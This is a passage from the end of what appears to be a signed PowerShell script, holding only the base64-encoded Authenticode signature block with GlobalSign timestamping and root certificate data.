# Y29tL2NhL2dzdHNhY2FzaGEzODRnNDBDBggrBgEFBQcwAoY3aHR0cDovL3NlY3Vy
# ZS5nbG9iYWxzaWduLmNvbS9jYWNlcnQvZ3N0c2FjYXNoYTM4NGc0LmNydDAfBgNV
# HSMEGDAWgBTqFsZp5+PLV0U5M6TwQL7Qw71lljBBBgNVHR8EOjA4MDagNKAyhjBo
# dHRwOi8vY3JsLmdsb2JhbHNpZ24uY29tL2NhL2dzdHNhY2FzaGEzODRnNC5jcmww
# DQYJKoZIhvcNAQELBQADggIBAJX0Z8+TmkOSgxd21iBVvIn/5F+y5RUat5cRQC4A
# Qb7FPySgG0cHMwRMtLRi/8bu0wzCNKCUXDeY60T4X/gnCgK+HtEkHSPLLxyrJ3qz
# qcUvDOTlkPAVJB6jFRn474PoT7toniNvfT0NcXBhMnxGbvKP0ZzoQ036g+H/xOA+
# /t5X3wZr82oGgWirDHwq949C/8BzadscpxZPJhlYc+2UXuQaohCCBzI7yp6/3Tl1
# 1LyLVD9+UJU0n5I5JFMYg1DUWy9mtHv+WynrHsUF/aM9+6Gw8yt5D7FLrMOj2aPc
# LJwrI5b2eiq7rcVXtoS2Y7NgmBHsxtZmbyKDHIpYA/SP7JxO0N/uzmEh07WVVEk7
# IVE9oSOFksJb8nqUhJgKjyRWIooE+rSaiUg1+G/rgYYRU8CTezq01DTMYtY1YY6m
# UPuIdB7XMTUhHhG/q6NkU45U4nNmpPtmY+E3ycRr+yszixHDdJCBg8hPhsrdSpfb
# fpBQJaFh7IabNlIHyz5iVewzpuW4GvrdJC4M+TKJMWo1lf720f8Xiq4jCSshrmLu
# 9+4357DJsxXtdpq3/ef+4WjeRMEKdOGVyFf7FOseWt+WdcVlGff01Y0hr2O26/Ti
# F0aft9cHbmqdK/7p0nFO0r5PYtNJ1mBfQON2mSBE2Epcs10a2eKqv01ZABeeYGc6
# RxKgMIIGWTCCBEGgAwIBAgINAewckkDe/S5AXXxHdDANBgkqhkiG9w0BAQwFADBM
# MSAwHgYDVQQLExdHbG9iYWxTaWduIFJvb3QgQ0EgLSBSNjETMBEGA1UEChMKR2xv
# YmFsU2lnbjETMBEGA1UEAxMKR2xvYmFsU2lnbjAeFw0xODA2MjAwMDAwMDBaFw0z
# NDEyMTAwMDAwMDBaMFsxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWdu
# IG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWduIFRpbWVzdGFtcGluZyBDQSAtIFNI
# QTM4NCAtIEc0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA8ALiMCP6
# 4BvhmnSzr3WDX6lHUsdhOmN8OSN5bXT8MeR0EhmW+s4nYluuB4on7lejxDXtszTH
# rMMM64BmbdEoSsEsu7lw8nKujPeZWl12rr9EqHxBJI6PusVP/zZBq6ct/XhOQ4j+
# kxkX2e4xz7yKO25qxIjw7pf23PMYoEuZHA6HpybhiMmg5ZninvScTD9dW+y279Jl
# z0ULVD2xVFMHi5luuFSZiqgxkjvyen38DljfgWrhsGweZYIq1CHHlP5CljvxC7F/
# f0aYDoc9emXr0VapLr37WD21hfpTmU1bdO1yS6INgjcZDNCr6lrB7w/Vmbk/9E81
# 8ZwP0zcTUtklNO2W7/hn6gi+j0l6/5Cx1PcpFdf5DV3Wh0MedMRwKLSAe70qm7uE
# 4Q6sbw25tfZtVv6KHQk+JA5nJsf8sg2glLCylMx75mf+pliy1NhBEsFV/W6Rxbux
# TAhLntRCBm8bGNU26mSuzv31BebiZtAOBSGssREGIxnk+wU0ROoIrp1JZxGLguWt
# WoanZv0zAwHemSX5cW7pnF0CTGA8zwKPAf1y7pLxpxLeQhJN7Kkm5XcCrA5XDAnR
# YZ4miPzIsk3bZPBFn7rBP1Sj2HYClWxqjcoiXPYMBOMp+kuwHNM3dITZHWarNHOP
# Hn18XpbWPRmwl+qMUJFtr1eGfhA3HWsaFN8CAwEAAaOCASkwggElMA4GA1UdDwEB
# /wQEAwIBhjASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBTqFsZp5+PLV0U5
# M6TwQL7Qw71lljAfBgNVHSMEGDAWgBSubAWjkxPioufi1xzWx/B/yGdToDA+Bggr
# BgEFBQcBAQQyMDAwLgYIKwYBBQUHMAGGImh0dHA6Ly9vY3NwMi5nbG9iYWxzaWdu
# LmNvbS9yb290cjYwNgYDVR0fBC8wLTAroCmgJ4YlaHR0cDovL2NybC5nbG9iYWxz
# aWduLmNvbS9yb290LXI2LmNybDBHBgNVHSAEQDA+MDwGBFUdIAAwNDAyBggrBgEF
# BQcCARYmaHR0cHM6Ly93d3cuZ2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wDQYJ
# KoZIhvcNAQEMBQADggIBAH/iiNlXZytCX4GnCQu6xLsoGFbWTL/bGwdwxvsLCa0A
# OmAzHznGFmsZQEklCB7km/fWpA2PHpbyhqIX3kG/T+G8q83uwCOMxoX+SxUk+RhE
# 7B/CpKzQss/swlZlHb1/9t6CyLefYdO1RkiYlwJnehaVSttixtCzAsw0SEVV3ezp
# Sp9eFO1yEHF2cNIPlvPqN1eUkRiv3I2ZOBlYwqmhfqJuFSbqtPl/KufnSGRpL9Ka
# oXL29yRLdFp9coY1swJXH4uc/LusTN763lNMg/0SsbZJVU91naxvSsguarnKiMMS
# ME6yCHOfXqHWmc7pfUuWLMwWaxjN5Fk3hgks4kXWss1ugnWl2o0et1sviC49ffHy
# kTAFnM57fKDFrK9RBvARxx0wxVFWYOh8lT0i49UKJFMnl4D6SIknLHniPOWbHuOq
# hIKJPsBK9SH+YhDtHTD89szqSCd8i3VCf2vL86VrlR8EWDQKie2CUOTRe6jJ5r5I
# qitV2Y23JSAOG1Gg1GOqg+pscmFKyfpDxMZXxZ22PLCLsLkcMe+97xTYFEBsIB3C
# LegLxo1tjLZx7VIh/j72n585Gq6s0i96ILH0rKod4i0UnfqWah3GPMrz2Ry/U02k
# R1l8lcRDQfkl4iwQfoH5DZSnffK1CfXYYHJAUJUg1ENEvvqglecgWbZ4xqRqqiKb
# MIIFgzCCA2ugAwIBAgIORea7A4Mzw4VlSOb/RVEwDQYJKoZIhvcNAQEMBQAwTDEg
# MB4GA1UECxMXR2xvYmFsU2lnbiBSb290IENBIC0gUjYxEzARBgNVBAoTCkdsb2Jh
# bFNpZ24xEzARBgNVBAMTCkdsb2JhbFNpZ24wHhcNMTQxMjEwMDAwMDAwWhcNMzQx
# MjEwMDAwMDAwWjBMMSAwHgYDVQQLExdHbG9iYWxTaWduIFJvb3QgQ0EgLSBSNjET
# MBEGA1UEChMKR2xvYmFsU2lnbjETMBEGA1UEAxMKR2xvYmFsU2lnbjCCAiIwDQYJ
# KoZIhvcNAQEBBQADggIPADCCAgoCggIBAJUH6HPKZvnsFMp7PPcNCPG0RQssgrRI
# xutbPK6DuEGSMxSkb3/pKszGsIhrxbaJ0cay/xTOURQh7ErdG1rG1ofuTToVBu1k
# ZguSgMpE3nOUTvOniX9PeGMIyBJQbUJmL025eShNUhqKGoC3GYEOfsSKvGRMIRxD
# aNc9PIrFsmbVkJq3MQbFvuJtMgamHvm566qjuL++gmNQ0PAYid/kD3n16qIfKtJw
# LnvnvJO7bVPiSHyMEAc4/2ayd2F+4OqMPKq0pPbzlUoSB239jLKJz9CgYXfIWHSw
# 1CM69106yqLbnQneXUQtkPGBzVeS+n68UARjNN9rkxi+azayOeSsJDa38O+2HBNX
# k7besvjihbdzorg1qkXy4J02oW9UivFyVm4uiMVRQkQVlO6jxTiWm05OWgtH8wY2
# SXcwvHE35absIQh1/OZhFj931dmRl4QKbNQCTXTAFO39OfuD8l4UoQSwC+n+7o/h
# bguyCLNhZglqsQY6ZZZZwPA1/cnaKI0aEYdwgQqomnUdnjqGBQCe24DWJfncBZ4n
# WUx2OVvq+aWh2IMP0f/fMBH5hc8zSPXKbWQULHpYT9NLCEnFlWQaYw55PfWzjMpY
# rZxCRXluDocZXFSxZba/jJvcE+kNb7gu3GduyYsRtYQUigAZcIN5kZeR1Bonvzce
# MgfYFGM8KEyvAgMBAAGjYzBhMA4GA1UdDwEB/wQEAwIBBjAPBgNVHRMBAf8EBTAD
# AQH/MB0GA1UdDgQWBBSubAWjkxPioufi1xzWx/B/yGdToDAfBgNVHSMEGDAWgBSu
# bAWjkxPioufi1xzWx/B/yGdToDANBgkqhkiG9w0BAQwFAAOCAgEAgyXt6NH9lVLN
# nsAEoJFp5lzQhN7craJP6Ed41mWYqVuoPId8AorRbrcWc+ZfwFSY1XS+wc3iEZGt
# Ixg93eFyRJa0lV7Ae46ZeBZDE1ZXs6KzO7V33EByrKPrmzU+sQghoefEQzd5Mr61
# 55wsTLxDKZmOMNOsIeDjHfrYBzN2VAAiKrlNIC5waNrlU/yDXNOd8v9EDERm8tLj
# vUYAGm0CuiVdjaExUd1URhxN25mW7xocBFymFe944Hn+Xds+qkxV/ZoVqW/hpvvf
# cDDpw+5CRu3CkwWJ+n1jez/QcYF8AOiYrg54NMMl+68KnyBr3TsTjxKM4kEaSHpz
# oHdpx7Zcf4LIHv5YGygrqGytXm3ABdJ7t+uA/iU3/gKbaKxCXcPu9czc8FB10jZp
# nOZ7BN9uBmm23goJSFmH63sUYHpkqmlD75HHTOwY3WzvUy2MmeFe8nI+z1TIvWfs
# pA9MRf/TuTAjB0yPEL+GltmZWrSZVxykzLsViVO6LAUP5MSeGbEYNNVMnbrt9x+v
# JJUEeKgDu+6B5dpffItKoZB0JaezPkvILFa9x8jvOOJckvB595yEunQtYQEgfn7R
# 8k8HWV+LLUNS60YMlOH1Zkd5d9VUWx+tJDfLRVpOoERIyNiwmcUVhAn21klJwGW4
# 5hpxbqCo8YLoRT5s1gLXCmeDBVrJpBAxggNJMIIDRQIBATBvMFsxCzAJBgNVBAYT
# AkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxT
# aWduIFRpbWVzdGFtcGluZyBDQSAtIFNIQTM4NCAtIEc0AhABm+reyE1rj/dsOp8u
# ASQWMAsGCWCGSAFlAwQCAaCCAS0wGgYJKoZIhvcNAQkDMQ0GCyqGSIb3DQEJEAEE
# MCsGCSqGSIb3DQEJNDEeMBwwCwYJYIZIAWUDBAIBoQ0GCSqGSIb3DQEBCwUAMC8G
# CSqGSIb3DQEJBDEiBCAMUTrxeGGTsLMt8deWOkVT9OKyAb+GW2/8cGUiFdSvHDCB
# sAYLKoZIhvcNAQkQAi8xgaAwgZ0wgZowgZcEIDqIepUbXrkqXuFPbLt2gjelRdAQ
# W/BFEb3iX4KpFtHoMHMwX6RdMFsxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9i
# YWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWduIFRpbWVzdGFtcGluZyBD
# QSAtIFNIQTM4NCAtIEc0AhABm+reyE1rj/dsOp8uASQWMA0GCSqGSIb3DQEBCwUA
# BIIBgKbR5NaHtthMIiCY8Kbx8r6dpv2uM/D/6GJM/Ao8XJEVr1jvGpYOEGghsV+X
# GuRjmEC1PfGDRj9h3yePxYq8+TjkP1c0NIiIM2RRAKDLJsR91LPNDJaRheXPMDfy
# MCcsvcksXhoOHlLzOOG4i0HNTz/7IDyBSj+qz8ZUJo9K6Up/BPGshMfj9CcaWulG
# mJPMGgFtRAWBIIubn/Mm02TFiDAz43qXd92x4KJEHs7uy3PIRsWdFw+u1EVkpZh8
# oMwyUji7Cnl9X2CuZb0GPBNt8qeo8SZ8C6bFudqnqdmsMhFjIV8nPPb4W8ngz4Bw
# ZGj2KgLiJCYA7eUeBXaWWQinfZWzZj91hv6jD9yM0JoWTB1Nn8gEYSx8QX3pIocy
# gfLOBMHTOm5u3jyT1/9LNjZa5sqcQY7XhDiiEicsSuxVycmQH00CHBh3LKPqzBSy
# wP/4xxnKJquL8m/OohE22lXDBM1WocjHQngV/SPjKcqfBaNI3AOulmbsmyAP2jWV
# iqmYOg==
# SIG # End signature block
